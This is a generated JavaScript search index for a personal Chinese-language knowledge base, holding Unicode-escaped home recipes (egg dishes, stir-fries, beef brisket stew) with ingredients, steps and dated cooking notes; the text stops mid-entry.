var __index = {"config":{"lang":["en","zh"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"index.html","title":"\u4e3b\u9875","text":"<p>\u200b\u8fd9\u91cc\u200b\u662f\u200b\u6770\u54e5\u200b\u7684\u200b\u77e5\u8bc6\u5e93\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u5728\u200b\u4e0a\u65b9\u200b\u7684\u200b\u83dc\u5355\u200b\u4e2d\u200b\u5bfb\u627e\u200b\u4f60\u200b\u60f3\u8981\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</p>"},{"location":"cooking/bocaichaojidan.html","title":"\u83e0\u83dc\u200b\u7092\u9e21\u86cb","text":""},{"location":"cooking/bocaichaojidan.html#_2","title":"\u98df\u6750","text":"<p>\u200b\u83e0\u83dc\u200b \u200b\u9e21\u86cb\u200b</p>"},{"location":"cooking/bocaichaojidan.html#_3","title":"\u6b65\u9aa4","text":"<ol> <li>\u200b\u83e0\u83dc\u200b\u6d17\u51c0\u200b \u200b\u76d0\u200b\u6c34\u6ce1\u200b\u4e00\u6bb5\u65f6\u95f4\u200b</li> <li>\u200b\u53ef\u200b\u9009\u200b\u83e0\u83dc\u200b\u5207\u6839\u200b</li> <li>\u200b\u9505\u4e2d\u200b\u628a\u200b\u6c34\u200b\u70e7\u5f00\u200b\uff0c\u200b\u4e0b\u76d0\u200b\u548c\u200b\u6cb9\u200b\uff0c\u200b\u4e0b\u200b\u83e0\u83dc\u200b\uff0c\u200b\u712f\u200b\u6c34\u5230\u200b\u6bb5\u751f\u200b</li> <li>\u200b\u628a\u200b\u83e0\u83dc\u200b\u53d6\u51fa\u200b\u653e\u5230\u200b\u51b7\u6c34\u200b\uff0c\u200b\u8fc7\u51b7\u200b\u6cb3\u200b</li> <li>\u200b\u7528\u200b\u53a8\u623f\u200b\u7eb8\u5438\u200b\u53bb\u200b\u83e0\u83dc\u200b\u4e0a\u200b\u7684\u200b\u6c34\u200b\uff0c\u200b\u5207\u6210\u200b 2cm \u200b\u7684\u200b\u6bb5\u200b</li> <li>\u200b\u628a\u200b\u83e0\u83dc\u200b\u653e\u5230\u200b\u6253\u597d\u200b\u7684\u200b\u86cb\u6db2\u200b\u4e2d\u200b\u6405\u62cc\u200b\uff1b\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4e0d\u200b\u6405\u62cc\u200b\uff0c\u200b\u628a\u200b\u9e21\u86cb\u200b\u7092\u200b\u597d\u200b\u4ee5\u540e\u200b\u548c\u200b\u83e0\u83dc\u200b\u6df7\u5408\u200b</li> <li>\u200b\u70ed\u9505\u200b\u51b7\u6cb9\u200b\uff0c\u200b\u628a\u200b\u83e0\u83dc\u200b\u548c\u200b\u86cb\u6db2\u200b\u4e0b\u9505\u200b</li> </ol>"},{"location":"cooking/bocaichaojidan.html#_4","title":"\u8bb0\u5f55","text":"<ul> <li>2025-03-03: \u200b\u505a\u200b\u4e86\u200b\u4e00\u6b21\u200b\uff0c\u200b\u9e21\u86cb\u200b\u4e0b\u200b\u7684\u200b\u5c11\u200b\u4e86\u200b\u70b9\u200b\uff0c\u200b\u505a\u200b\u5b8c\u200b\u4ee5\u540e\u200b\u90fd\u200b\u770b\u4e0d\u89c1\u200b\u4e86\u200b\uff0c\u200b\u6ce8\u610f\u200b\u6bd4\u4f8b\u200b</li> </ul>"},{"location":"cooking/bocaichaojidan.html#_5","title":"\u53c2\u8003","text":"<ul> <li>\u200b\u53a8\u5e08\u957f\u200b\u6559\u200b\u4f60\u200b\uff1a\u201c\u200b\u9e2d\u86cb\u200b\u7092\u200b\u83e0\u83dc\u200b\u201d\u200b\u7684\u200b\u5bb6\u5e38\u200b\u505a\u6cd5\u200b\uff0c\u200b\u5e94\u5b63\u200b\u7684\u200b\u5feb\u200b\u624b\u83dc\u200b\uff0c\u200b\u6536\u85cf\u200b\u4e86\u200b</li> <li>\u200b\u4e00\u628a\u200b\u83e0\u83dc\u200b\u4e09\u4e2a\u200b\u9e21\u86cb\u200b\uff0c\u200b\u50cf\u200b\u6211\u200b\u8fd9\u6837\u200b\u7b80\u5355\u200b\u4e00\u505a\u200b\uff0c\u200b\u6bd4\u200b\u5927\u9c7c\u5927\u8089\u200b\u8fd8\u200b\u597d\u5403\u200b</li> </ul>"},{"location":"cooking/chaoqincai.html","title":"\u7092\u200b\u82b9\u83dc","text":""},{"location":"cooking/chaoqincai.html#_2","title":"\u98df\u6750","text":"<p>\u200b\u82b9\u83dc\u200b</p>"},{"location":"cooking/chaoqincai.html#_3","title":"\u6b65\u9aa4","text":"<ol> <li>\u200b\u53bb\u6389\u200b\u53f6\u5b50\u200b\u548c\u200b\u6839\u200b\uff0c\u200b\u6495\u6389\u200b\u82b9\u83dc\u200b\u7684\u200b\u7b4b\u200b\uff0c\u200b\u5207\u200b\u83f1\u5f62\u200b\u5757\u200b\uff0c\u200b\u4e0d\u8981\u200b\u592a\u539a\u200b</li> <li>\u200b\u628a\u200b\u82b9\u83dc\u200b\u4e0b\u200b\u5230\u200b\u5f00\u6c34\u200b\uff0c\u200b\u4e0b\u76d0\u200b\u548c\u200b\u6cb9\u200b\uff0c\u200b\u712f\u200b\u6c34\u200b\uff0c\u200b\u635e\u51fa\u200b\u8fc7\u51b7\u200b\u6cb3\u200b</li> <li>\u200b\u4e0b\u6cb9\u200b\u628a\u200b\u849c\u200b\u7206\u9999\u200b\uff0c\u200b\u52a0\u200b\u5c11\u91cf\u200b\u6c34\u548c\u76d0\u200b\uff0c\u200b\u4e0b\u200b\u82b9\u83dc\u200b\uff0c\u200b\u7ffb\u7092\u200b</li> </ol>"},{"location":"cooking/chaoqincai.html#_4","title":"\u8bb0\u5f55","text":"<ul> <li>2025-03-15: \u200b\u505a\u200b\u4e86\u200b\u4e00\u6b21\u200b\uff0c\u200b\u82b9\u83dc\u200b\u5904\u7406\u200b\u5f97\u200b\u4e0d\u591f\u200b\u7ec6\u81f4\u200b\uff0c\u200b\u5757\u200b\u6bd4\u8f83\u200b\u7c97\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6ca1\u6709\u200b\u53bb\u6389\u200b\u7b4b\u200b\uff0c\u200b\u5f71\u54cd\u200b\u53e3\u611f\u200b</li> </ul>"},{"location":"cooking/chaoqincai.html#_5","title":"\u53c2\u8003","text":"<ul> <li>\u200b\u6e05\u7092\u200b\u897f\u82b9\u200b\u7684\u200b\u5bb6\u5e38\u200b\u505a\u6cd5\u200b\uff0c\u200b\u6e05\u8106\u200b\u723d\u53e3\u200b\u6709\u5999\u200b\u62db\u200b\uff0c\u200b\u51cf\u8102\u200b\u517b\u751f\u200b\u5fc5\u5907\u200b\uff0c\u200b\u5148\u200b\u6536\u85cf\u200b\u4e86\u200b\uff01</li> <li>\u200b\u597d\u5403\u200b\u7684\u200b\u7d20\u200b\u7092\u200b\u82b9\u83dc\u200b\uff0c\u200b\u7b80\u5355\u200b\u5feb\u624b\u200b\u7684\u200b\u4e00\u9053\u200b\u7d20\u83dc\u200b\uff01</li> </ul>"},{"location":"cooking/congbaorou.html","title":"\u8471\u7206\u200b\u8089","text":""},{"location":"cooking/congbaorou.html#_2","title":"\u98df\u6750","text":"<p>\u200b\u5927\u8471\u200b \u200b\u732a\u8089\u200b\u6216\u200b\u7f8a\u8089\u200b\u6216\u200b\u9e21\u8089\u200b</p>"},{"location":"cooking/congbaorou.html#_3","title":"\u6b65\u9aa4","text":"<ol> <li>\u200b\u5927\u8471\u200b\u5207\u6bb5\u200b\u6216\u200b\u6eda\u5200\u200b\u5757\u200b\uff0c\u200b\u8089\u200b\u5207\u7247\u200b</li> <li>\u200b\u8089\u200b\u5207\u7247\u200b\uff0c\u200b\u6d17\u200b\u5e72\u51c0\u200b\uff0c\u200b\u6324\u200b\u5e72\u6c34\u540e\u200b\u8c03\u5473\u200b\uff0c\u200b\u53ef\u9009\u52a0\u200b\u86cb\u6e05\u200b\uff0c\u200b\u52a0\u200b\u6dc0\u7c89\u200b\uff0c\u200b\u6405\u62cc\u200b\uff0c\u200b\u53ef\u200b\u9009\u200b\u52a0\u6cb9\u200b</li> <li>\u200b\u8089\u7247\u200b\u4e0b\u9505\u200b\uff0c\u200b\u6ed1\u200b\u7092\u200b\uff0c\u200b\u5012\u200b\u51fa\u200b</li> <li>\u200b\u7092\u200b\u5927\u8471\u200b\uff0c\u200b\u8c03\u5473\u200b\uff0c\u200b\u5012\u5165\u200b\u8089\u7247\u200b</li> </ol>"},{"location":"cooking/congbaorou.html#_4","title":"\u8bb0\u5f55","text":"<ul> <li>2025-04-15: \u200b\u505a\u200b\u4e86\u200b\u4e00\u6b21\u200b\uff0c170g \u200b\u732a\u200b\u91cc\u810a\u8089\u200b\u52a0\u200b 250g \u200b\u5927\u8471\u200b\uff0c\u200b\u6ca1\u6709\u200b\u4e0a\u6d46\u200b\uff0c\u200b\u611f\u89c9\u200b\u5927\u8471\u200b\u505a\u200b\u5f97\u200b\u4e0d\u591f\u200b\u5165\u5473\u200b\u4e5f\u200b\u4e0d\u591f\u200b\u8f6f\u200b\uff0c\u200b\u53ef\u80fd\u200b\u65f6\u95f4\u200b\u4e0d\u592a\u591f\u200b</li> </ul>"},{"location":"cooking/congbaorou.html#_5","title":"\u53c2\u8003","text":"<ul> <li>\u200b\u4e3a\u4ec0\u4e48\u200b\u996d\u5e97\u200b\u7684\u200b\u8471\u7206\u200b\u8089\u200b\u8fd9\u4e48\u200b\u597d\u5403\u200b\uff1f\u200b\u8001\u53a8\u200b\u6559\u200b\u4f60\u200b\u6b63\u5b97\u200b\u505a\u6cd5\u200b\uff0c\u200b\u8089\u7247\u200b\u6ed1\u5ae9\u200b\u6709\u200b\u6280\u5de7\u200b</li> <li>\u200b\u8089\u5ae9\u200b\u591a\u6c41\u200b\u6ed1\u5ae9\u200b\u4e0d\u200b\u67f4\u200b\u7684\u200b\u8471\u7206\u200b\u8089\u200b\u5728\u5bb6\u200b\u505a\u200b\u4e0d\u597d\u200b\u7684\u200b\u5c31\u200b\u50cf\u200b\u8001\u5f1f\u200b\u8fd9\u4e48\u200b\u505a\u200b\u5427\u200b#\u200b\u7f8e\u98df\u200b #\u200b\u70ed\u95e8\u200b</li> <li>\u200b\u6211\u200b\u505a\u200b\u7684\u200b\u201c\u200b\u8471\u7206\u200b\u91cc\u810a\u200b\u201d\u200b\u5f88\u200b\u597d\u5403\u200b\uff01\u200b\u8089\u7247\u200b\u5ae9\u200b\u6ed1\u200b\u8471\u200b\u9999\u200b\u6d53\u90c1\u200b\u3001\u200b\u505a\u6cd5\u200b\u5b9e\u7528\u200b\u63a5\u5730\u200b\u6c14\u6613\u200b\u638c\u63e1\u200b</li> <li>\u200b\u53a8\u5e08\u957f\u200b\u6559\u200b\u4f60\u200b\uff1a\u201c\u200b\u8471\u7206\u200b\u7f8a\u8089\u200b\u201d\u200b\u7f8a\u8089\u200b\u6ed1\u5ae9\u200b\u3001\u200b\u9c9c\u9999\u200b\u4e0d\u200b\u81bb\u200b</li> </ul>"},{"location":"cooking/ganchaoniuhe.html","title":"\u5e72\u200b\u7092\u200b\u725b\u6cb3","text":""},{"location":"cooking/ganchaoniuhe.html#_2","title":"\u98df\u6750","text":"<p>\u200b\u725b\u8089\u200b \u200b\u6cb3\u7c89\u200b \u200b\u6d0b\u8471\u200b \u200b\u7eff\u8c46\u82bd\u200b \u200b\u97ed\u9ec4\u200b \u200b\u5c0f\u8471\u200b</p>"},{"location":"cooking/ganchaoniuhe.html#_3","title":"\u6b65\u9aa4","text":"<ol> <li>\u200b\u725b\u8089\u200b\u5207\u7247\u200b 3mm\uff0c\u200b\u6d0b\u8471\u200b\u5207\u4e1d\u200b\uff0c\u200b\u7eff\u8c46\u82bd\u200b\u53bb\u200b\u5934\u5c3e\u200b\uff0c\u200b\u6cb3\u7c89\u200b\u6ce1\u6c34\u200b\u62b9\u6cb9\u200b\uff0c\u200b\u97ed\u9ec4\u200b\u5207\u6bb5\u200b\uff0c\u200b\u5c0f\u8471\u200b\u5207\u6bb5\u200b</li> <li>\u200b\u814c\u5236\u200b\u725b\u8089\u200b\uff0c\u200b\u4e0b\u76d0\u200b\u3001\u200b\u751f\u62bd\u200b\u3001\u200b\u80e1\u6912\u7c89\u200b\u3001\u200b\u6dc0\u7c89\u200b\u3001\u200b\u7cd6\u200b\u548c\u200b\u8017\u6cb9\u200b\uff0c\u200b\u6dcb\u200b\u82b1\u751f\u6cb9\u200b</li> <li>\u200b\u7092\u200b\u725b\u8089\u200b\u5230\u200b\u4e94\u200b\u6210\u719f\u200b\uff0c\u200b\u5012\u200b\u51fa\u200b</li> <li>\u200b\u7092\u200b\u6d0b\u8471\u200b\u4e1d\u200b\u548c\u200b\u8c46\u82bd\u200b\uff0c\u200b\u653e\u76d0\u200b\uff0c\u200b\u6492\u6c34\u200b\uff0c\u200b\u5012\u200b\u51fa\u200b</li> <li>\u200b\u714e\u200b\u6cb3\u7c89\u200b\uff0c\u200b\u653e\u76d0\u200b\uff0c\u200b\u7b49\u200b\u6cb3\u7c89\u200b\u8f6c\u9ec4\u200b</li> <li>\u200b\u4e0b\u200b\u725b\u8089\u200b\u3001\u200b\u6d0b\u8471\u200b\u548c\u200b\u7eff\u8c46\u82bd\u200b\uff0c\u200b\u4e0b\u200b\u751f\u62bd\u200b \u200b\u869d\u6cb9\u200b \u200b\u76d0\u200b \u200b\u7cd6\u200b \u200b\u80e1\u6912\u7c89\u200b</li> <li>\u200b\u4e0b\u200b\u97ed\u9ec4\u200b\u3001\u200b\u5c0f\u8471\u200b\u76f4\u81f3\u200b\u65ad\u751f\u200b</li> </ol>"},{"location":"cooking/ganchaoniuhe.html#_4","title":"\u8bb0\u5f55","text":"<ul> <li>2025-02-15: \u200b\u5c1d\u8bd5\u200b\u4e86\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u6cb3\u7c89\u200b\u7c98\u9505\u200b\u4e25\u91cd\u200b\uff0c\u200b\u4e0b\u6b21\u200b\u6ce8\u610f\u200b\u6cb3\u7c89\u200b\u7684\u200b\u5904\u7406\u200b\uff0c\u200b\u63d0\u524d\u200b\u6ce1\u6c34\u200b + \u200b\u62b9\u200b\u4e00\u5c42\u200b\u6cb9\u200b\uff1b\u200b\u6ca1\u6709\u200b\u97ed\u9ec4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b\u849c\u9ec4\u200b\u66ff\u4ee3\u200b</li> </ul>"},{"location":"cooking/ganchaoniuhe.html#_5","title":"\u53c2\u8003","text":"<ul> <li>\u200b\u7f8e\u56fd\u200b\u7559\u5b50\u200b\u4e00\u9053\u200b\u5e72\u200b\u7092\u200b\u725b\u6cb3\u200b\uff0c\u200b\u90bb\u5c45\u4eec\u200b\u62a2\u200b\u7740\u200b\u4e0a\u95e8\u200b\u62dc\u5e74\u200b</li> <li>\u200b\u5e72\u200b\u7092\u200b\u725b\u6cb3\u200b\uff1a\u200b\u65b0\u624b\u6751\u200b\u901f\u901a\u200b\uff01</li> </ul>"},{"location":"cooking/jiandan.html","title":"\u714e\u86cb","text":""},{"location":"cooking/jiandan.html#_2","title":"\u98df\u6750","text":"<p>\u200b\u9e21\u86cb\u200b</p>"},{"location":"cooking/jiandan.html#_3","title":"\u6b65\u9aa4","text":"<ol> <li>\u200b\u51b7\u6cb9\u200b\u4e0b\u9505\u200b\uff0c\u200b\u5168\u7a0b\u200b\u5c0f\u706b\u200b\uff0c\u200b\u6839\u636e\u200b\u60f3\u8981\u200b\u7684\u200b\u6548\u679c\u200b\u9009\u62e9\u200b\u4e0d\u540c\u200b\u7684\u200b\u64cd\u4f5c\u200b</li> <li>\u200b\u9e21\u86cb\u200b\u53ef\u4ee5\u200b\u5148\u6253\u200b\u5230\u200b\u7897\u200b\u91cc\u200b\u6405\u62cc\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4e0b\u9505\u200b\uff0c\u200b\u524d\u8005\u200b\u6bd4\u8f83\u200b\u5747\u5300\u200b\uff0c\u200b\u540e\u8005\u200b\u86cb\u9ec4\u200b\u86cb\u767d\u200b\u5206\u660e\u200b</li> <li>\u200b\u7ffb\u9762\u200b\u8981\u200b\u6709\u200b\u8010\u5fc3\u200b\uff0c\u200b\u4ece\u200b\u8fb9\u4e0a\u200b\u4e00\u70b9\u70b9\u200b\u94f2\u200b\uff0c\u200b\u628a\u200b\u9e21\u86cb\u200b\u5f04\u200b\u5230\u200b\u9505\u94f2\u200b\u4e0a\u200b\u518d\u200b\u7ffb\u200b\uff1b\u200b\u5982\u679c\u200b\u9e21\u86cb\u200b\u591a\u200b\u4e86\u200b\u4e0d\u597d\u200b\u7ffb\u9762\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4e00\u4e2a\u200b\u4e00\u4e2a\u200b\u714e\u200b</li> <li>\u200b\u60f3\u8981\u200b\u8377\u5305\u86cb\u200b\uff0c\u200b\u5c31\u200b\u5148\u200b\u628a\u200b\u9e21\u86cb\u200b\u6253\u200b\u5230\u200b\u6bd4\u8f83\u200b\u5927\u200b\u7684\u200b\u9505\u200b\u52fa\u200b\u91cc\u200b\uff0c\u200b\u6c34\u6d74\u52a0\u200b\u70ed\u200b</li> <li>\u200b\u60f3\u8981\u200b\u6ed1\u86cb\u200b\uff0c\u200b\u5c31\u200b\u5728\u200b\u9e21\u86cb\u200b\u5e95\u90e8\u200b\u5b9a\u578b\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u628a\u200b\u9e21\u86cb\u200b\u5f80\u200b\u8fb9\u4e0a\u200b\u63a8\u200b\uff0c\u200b\u8fd9\u6837\u200b\u4e0a\u9762\u200b\u7684\u200b\u86cb\u6db2\u200b\u5c31\u4f1a\u6d41\u200b\u51fa\u6765\u200b</li> <li>\u200b\u4e0d\u5b9c\u200b\u4e00\u6b21\u200b\u5012\u592a\u591a\u200b\u9e21\u86cb\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5206\u6279\u200b\u5012\u5165\u200b\uff0c\u200b\u6bcf\u6b21\u200b\u4e00\u5230\u200b\u4e24\u4e2a\u200b\u9e21\u86cb\u200b\u6bd4\u8f83\u200b\u5408\u9002\u200b</li> </ol>"},{"location":"cooking/jiandan.html#_4","title":"\u8bb0\u5f55","text":"<ul> <li>\u200b\u505a\u200b\u7684\u200b\u6b21\u6570\u200b\u591a\u200b\u4e86\u200b\uff0c\u200b\u4e0d\u200b\u8bb0\u5f55\u200b\u4e86\u200b</li> </ul>"},{"location":"cooking/jiandan.html#_5","title":"\u53c2\u8003","text":"<ul> <li>\u200b\u5982\u4f55\u200b\u5b8c\u7f8e\u200b\u5730\u200b\u505a\u51fa\u200b\u5404\u79cd\u200b\u719f\u5ea6\u200b\u7684\u200b\u714e\u86cb\u200b\uff1f\u200b\u6e8f\u200b\u5fc3\u200b\u3001\u200b\u5168\u719f\u200b\u3001\u200b\u6f2b\u753b\u200b\uff0c\u200b\u90fd\u200b\u7ed9\u200b\u4f60\u200b\u7b54\u6848\u200b</li> <li>\u3010\u200b\u4e00\u9897\u200b\u4e0d\u7c98\u9505\u200b\u7684\u200b\u714e\u86cb\u200b\u3011\u200b\u714e\u86cb\u200b\u6559\u5b66\u200b\u89c6\u9891\u200b\u6765\u200b\u4e86\u200b\uff0c\u200b\u5feb\u200b\u6765\u770b\u200b\u770b\u5427\u200b</li> <li>\u200b\u7b80\u5355\u200b\u5feb\u624b\u200b\uff013 \u200b\u5206\u949f\u200b\u5c31\u200b\u53ef\u200b\u641e\u5b9a\u200b\u7684\u200b\u714e\u200b\u6ed1\u200b\u86cb\u200b\uff0c\u200b\u597d\u9999\u200b\uff0c\u200b\u597d\u200b\u597d\u5403\u200b</li> <li>\u200b\u5bb6\u5ead\u7248\u200b\u714e\u200b\u8377\u5305\u86cb\u200b\uff0c\u200b\u51b7\u6cb9\u200b\u4e0b\u9505\u200b\uff0c\u200b\u5c0f\u706b\u200b\u6162\u200b\u714e\u200b\uff0c\u200b\u4e0d\u200b\u6563\u82b1\u200b\u4e0d\u7c98\u9505\u200b\uff0c\u200b\u597d\u770b\u200b\u53c8\u200b\u597d\u5403\u200b</li> <li>\u200b\u5f88\u591a\u200b\u4eba\u200b\u90fd\u200b\u4e0d\u4f1a\u200b\u505a\u200b\u8377\u5305\u86cb\u200b\uff0c\u200b\u6559\u200b\u4f60\u200b\u5c0f\u200b\u6280\u5de7\u200b\uff0c\u200b\u4e2a\u4e2a\u200b\u5706\u5ae9\u200b\u4e0d\u200b\u6563\u82b1\u200b\uff0c\u200b\u597d\u770b\u200b\u53c8\u200b\u597d\u5403\u200b</li> </ul>"},{"location":"cooking/liangbanzhengqiezi.html","title":"\u51c9\u62cc\u200b\u84b8\u200b\u8304\u5b50","text":""},{"location":"cooking/liangbanzhengqiezi.html#_2","title":"\u98df\u6750","text":"<p>\u200b\u8304\u5b50\u200b \u200b\u8471\u200b \u200b\u849c\u200b</p>"},{"location":"cooking/liangbanzhengqiezi.html#_3","title":"\u6b65\u9aa4","text":"<ol> <li>\u200b\u628a\u200b\u8304\u5b50\u200b\u7eb5\u5411\u200b\u5207\u5f00\u200b\uff0c\u200b\u84b8\u5230\u200b\u6bd4\u8f83\u200b\u8f6f\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u7b97\u4e0a\u200b\u70e7\u200b\u5f00\u6c34\u200b\u65f6\u95f4\u200b\u5927\u6982\u200b\u5341\u591a\u5206\u949f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b\u7535\u996d\u7172\u200b\u84b8\u200b\uff0c\u200b\u5982\u679c\u200b\u7535\u996d\u7172\u200b\u4e0d\u591f\u200b\u5927\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u628a\u200b\u8304\u5b50\u200b\u5207\u77ed\u200b\u4e00\u70b9\u200b</li> <li>\u200b\u8c03\u200b\u4e00\u4e2a\u200b\u6599\u6c41\u200b\uff1a\u200b\u8471\u200b\u5241\u788e\u200b\uff0c\u200b\u62cd\u200b\u849c\u84c9\u200b\uff0c\u200b\u52a0\u9648\u918b\u200b\uff0c\u200b\u751f\u62bd\u200b\uff0c\u200b\u76d0\u200b\uff0c\u200b\u7cd6\u200b\uff0c\u200b\u8fd9\u200b\u91cc\u9762\u200b\u5473\u9053\u200b\u4e3b\u8981\u200b\u662f\u200b\u918b\u200b\u548c\u200b\u849c\u200b</li> <li>\u200b\u8304\u5b50\u200b\u84b8\u597d\u200b\u4ee5\u540e\u200b\u6495\u6210\u200b\u5c0f\u6761\u200b\uff0c\u200b\u653e\u51c9\u200b\u4e00\u70b9\u200b\uff08\u200b\u53ef\u4ee5\u200b\u653e\u200b\u51b0\u7bb1\u200b\uff09\uff0c\u200b\u6d47\u200b\u4e0a\u6599\u200b\u6c41\u200b\uff0c\u200b\u62cc\u5300\u200b\u5373\u53ef\u200b</li> </ol>"},{"location":"cooking/liangbanzhengqiezi.html#_4","title":"\u8bb0\u5f55","text":"<ul> <li>2025-03-25: \u200b\u7b2c\u4e00\u6b21\u200b\u505a\u200b\uff0c\u200b\u9648\u918b\u200b\u653e\u591a\u200b\u4e86\u200b\u4e00\u70b9\u200b\uff0c\u200b\u4f46\u662f\u200b\u5473\u9053\u200b\u5f88\u200b\u597d\u200b\uff0c\u200b\u53e3\u611f\u200b\u4e5f\u200b\u4e0d\u9519\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u518d\u200b\u6495\u200b\u5c0f\u200b\u4e00\u70b9\u200b\uff1b\u200b\u84b8\u200b\u7684\u200b\u65f6\u95f4\u200b\u4e45\u200b\u4e86\u200b\u4e00\u70b9\u200b\uff0c\u200b\u51fa\u200b\u4e86\u200b\u5f88\u591a\u200b\u6c34\u200b\uff0c\u200b\u4e0b\u6b21\u200b\u53ef\u4ee5\u200b\u63d0\u65e9\u200b\u4e00\u70b9\u200b\u53d6\u51fa\u200b</li> </ul>"},{"location":"cooking/liangbanzhengqiezi.html#_5","title":"\u53c2\u8003","text":"<ul> <li>\u200b\u5929\u70ed\u200b\u5c31\u200b\u5403\u200b\u624b\u200b\u6495\u200b\u849c\u200b\u8304\u5b50\u200b\uff0c\u200b\u5b66\u4f1a\u200b\u8001\u53a8\u200b\u7684\u200b\u62cc\u200b\u51c9\u83dc\u200b\u8bc0\u7a8d\u200b\uff0c\u200b\u62cc\u200b\u4ec0\u4e48\u200b\u83dc\u200b\u90fd\u200b\u5f00\u80c3\u200b\u89e3\u998b\u200b</li> </ul>"},{"location":"cooking/luoboniunanbao.html","title":"\u841d\u535c\u200b\u725b\u8169\u200b\u7172","text":""},{"location":"cooking/luoboniunanbao.html#_2","title":"\u98df\u6750","text":"<p>\u200b\u725b\u8169\u200b \u200b\u767d\u841d\u535c\u200b</p>"},{"location":"cooking/luoboniunanbao.html#_3","title":"\u6b65\u9aa4","text":"<ol> <li>\u200b\u725b\u8169\u200b\u5207\u5757\u200b\uff0c\u200b\u6d17\u6389\u200b\u8840\u6cab\u200b\uff0c\u200b\u5438\u5e72\u200b\u8840\u6c34\u200b\uff0c\u200b\u712f\u200b\u6c34\u200b\uff0c\u200b\u7528\u200b\u6f0f\u52fa\u200b\u6487\u53bb\u200b\u6d6e\u6cab\u200b</li> <li>\u200b\u8c03\u5473\u200b\uff0c\u200b\u5404\u79cd\u200b\u9999\u6599\u200b\uff0c\u200b\u59dc\u200b\u8471\u849c\u200b\uff0c\u200b\u67f1\u4faf\u9171\u200b\uff0c\u200b\u869d\u6cb9\u200b\uff0c\u200b\u751f\u62bd\u200b\uff0c\u200b\u5c0f\u706b\u200b\u6162\u200b\u7092\u200b\uff0c\u200b\u518d\u200b\u5012\u5165\u200b\u725b\u8089\u200b</li> <li>\u200b\u767d\u841d\u535c\u200b\u524a\u76ae\u200b\uff0c\u200b\u53ef\u200b\u9009\u200b\u7b80\u5355\u200b\u7092\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u52a0\u200b\u7ea2\u841d\u535c\u200b\u6216\u200b\u571f\u8c46\u200b</li> <li>\u200b\u725b\u8169\u200b\u548c\u200b\u767d\u841d\u535c\u200b\u653e\u8fdb\u200b\u7535\u996d\u7172\u200b\u6216\u200b\u9ad8\u538b\u9505\u200b\uff08\u200b\u63a8\u8350\u200b\uff09\uff0c\u200b\u52a0\u6c34\u200b\u5230\u200b\u6ca1\u8fc7\u200b\u98df\u6750\u200b\uff0c\u200b\u52a0\u200b\u51b0\u7cd6\u200b\uff0c\u200b\u7172\u200b\u4e00\u4e2a\u591a\u200b\u5c0f\u65f6\u200b\uff08\u200b\u7535\u996d\u7172\u200b\u65f6\u95f4\u200b\u8981\u957f\u200b\u4e00\u4e9b\u200b\uff09\uff0c\u200b\u8c03\u6599\u200b\u53ef\u4ee5\u200b\u653e\u200b\u591a\u4e00\u4e9b\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u6c34\u200b\u5f88\u591a\u200b</li> </ol>"},{"location":"cooking/luoboniunanbao.html#_4","title":"\u8bb0\u5f55","text":"<ul> <li>2025-03-22: \u200b\u7b2c\u4e09\u6b21\u200b\u505a\u200b\uff0c\u200b\u8fd9\u6b21\u200b\u505a\u6cd5\u200b\u548c\u200b\u7b2c\u4e8c\u6b21\u200b\u57fa\u672c\u200b\u4e00\u6837\u200b\uff0c\u200b\u5c31\u662f\u200b\u5438\u53d6\u200b\u4e86\u200b\u6559\u8bad\u200b\uff0c\u200b\u59dc\u5207\u200b\u7684\u200b\u662f\u200b\u7247\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5403\u200b\u7684\u200b\u65f6\u5019\u200b\u597d\u200b\u6311\u51fa\u6765\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u59dc\u200b\u7684\u200b\u8868\u9762\u79ef\u200b\u4e5f\u200b\u5c0f\u200b\u4e86\u200b\uff0c\u200b\u53ef\u80fd\u200b\u8981\u200b\u9002\u5f53\u200b\u591a\u653e\u200b\u4e00\u4e24\u7247\u200b\uff1b\u200b\u725b\u8169\u200b\u56e0\u4e3a\u200b\u4e70\u200b\u7684\u200b\u6bd4\u8f83\u200b\u591a\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5206\u200b\u4e86\u200b\u4e09\u6b21\u200b\u505a\u200b\u624d\u200b\u5403\u200b\u5b8c\u200b\uff0c\u200b\u80fd\u200b\u611f\u89c9\u200b\u5230\u200b\u51b7\u51bb\u200b\u4e45\u200b\u4e86\u200b\u8089\u8d28\u200b\u7684\u200b\u4e0b\u964d\u200b</li> <li>2025-03-16: \u200b\u7b2c\u4e8c\u6b21\u200b\u505a\u200b\uff0c\u200b\u8fd9\u6b21\u200b\u725b\u8169\u200b\u548c\u200b\u767d\u841d\u535c\u200b\u5207\u200b\u7684\u200b\u66f4\u200b\u5c0f\u200b\u4e00\u4e9b\u200b\uff0c\u200b\u914d\u5408\u200b\u7535\u996d\u7172\u200b\u7528\u200b\u7172\u6c64\u200b\u6a21\u5f0f\u200b\u716e\u200b\u4e24\u200b\u5c0f\u65f6\u200b\uff0c\u200b\u8fbe\u5230\u200b\u725b\u8169\u200b\u548c\u200b\u767d\u841d\u535c\u200b\u90fd\u200b\u5f88\u200b\u8f6f\u70c2\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u5f88\u200b\u597d\u5403\u200b\uff1b\u200b\u8fd9\u6b21\u200b\u67f1\u4faf\u9171\u200b\u4e0b\u200b\u4e86\u200b\u4e24\u52fa\u200b\uff0c\u200b\u5473\u9053\u200b\u5f88\u8db3\u200b\uff0c\u200b\u548c\u200b\u996d\u5e97\u200b\u5403\u200b\u5230\u200b\u7684\u200b\u5473\u9053\u200b\u6bd4\u8